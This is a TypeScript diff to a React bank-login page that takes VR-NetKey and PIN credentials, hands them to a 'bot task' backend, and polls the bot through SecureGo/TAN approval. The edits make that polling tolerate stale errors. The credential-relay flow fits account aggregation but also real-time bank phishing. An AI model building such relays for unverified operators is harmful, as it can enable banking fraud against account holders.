@@ -120,7 +120,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
 
-  const pollRef = useRef<{ timer: any; startedAt: number; taskId: string } | null>(null);
+  const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
 
   useEffect(() => {
     (async () => {
@@ -223,7 +223,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   function startPolling(taskId: string, startedAt: number) {
     stopPolling();
-    pollRef.current = { timer: null, startedAt, taskId };
+    pollRef.current = { timer: null, startedAt, taskId, positiveSeen: false };
     const tick = async () => {
       if (!pollRef.current || pollRef.current.taskId !== taskId) return;
       if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
@@ -234,16 +234,19 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
       const { status, data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
       if (!pollRef.current || pollRef.current.taskId !== taskId) return;
 
-      // Log full response for debugging
       console.log("[bot/task]", { status, data });
 
       if (status === 404) {
+        // If we already saw positive signals, a transient 404 shouldn't kill the flow.
+        if (pollRef.current.positiveSeen) {
+          pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
+          return;
+        }
         setErrorMsg("Session abgelaufen, bitte neu starten.");
         resetToForm();
         return;
       }
       if (status === 0 || status >= 500) {
-        // transient network / upstream error → keep polling
         pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
         return;
       }
@@ -276,23 +279,39 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         data,
         /secure\s*go|sicherheitsfreigabe|kundenauthentifizierung|freigabe|tan\s*(?:erforderlich|required)|push\s*(?:tan|freigabe)/i,
       );
+      const tanConfirmedSignal =
+        st === "tan_confirmed" ||
+        payloadValues.some(([key, value]) =>
+          (key === "tan_confirmed" || key === "approved" || key === "freigegeben") &&
+          (value === true || value === 1 || String(value).toLowerCase() === "true"),
+        );
 
-      // A positive credential validation always wins over a stale/generic
-      // `failed` status. Some bot backends report `failed` while the actual
-      // next step is the SecureGo customer authentication.
-      if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo) {
-        setPhase("tan");
-        setSubmitting(false);
-      } else if (st === "tan_confirmed" || st === "running" || st === "pending") {
-        setSubmitting(true);
-      } else if (st === "completed") {
+      if (tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal || st === "waiting_for_tan" || st === "completed") {
+        pollRef.current.positiveSeen = true;
+      }
+
+      // Completed always wins
+      if (st === "completed") {
         setResult(data?.result ?? null);
         setPhase("result");
         setSubmitting(false);
         clearTask();
         stopPolling();
         return;
+      }
+
+      if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
+        setPhase("tan");
+        setSubmitting(false);
+      } else if (st === "running" || st === "pending") {
+        setSubmitting(true);
       } else if (st === "failed") {
+        // Ignore a stale/late `failed` if we already saw positive signals
+        // (e.g., user approved TAN before UI transitioned to the TAN screen).
+        if (pollRef.current.positiveSeen) {
+          pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
+          return;
+        }
         setErrorMsg("VR-NetKey oder PIN falsch.");
         resetToForm();
         return;
@@ -303,8 +322,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
       } else {
         setSubmitting(true);
       }
-
-
 
       pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
     };
@@ -332,6 +349,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    // Prevent duplicate task creation if a polling loop is already active.
+    if (submitting || pollRef.current) return;
     let hasErr = false;
     if (!vrNetKey.trim()) { setVrNetKeyError(true); hasErr = true; }
     if (!pin.trim()) { setPinError(true); hasErr = true; }
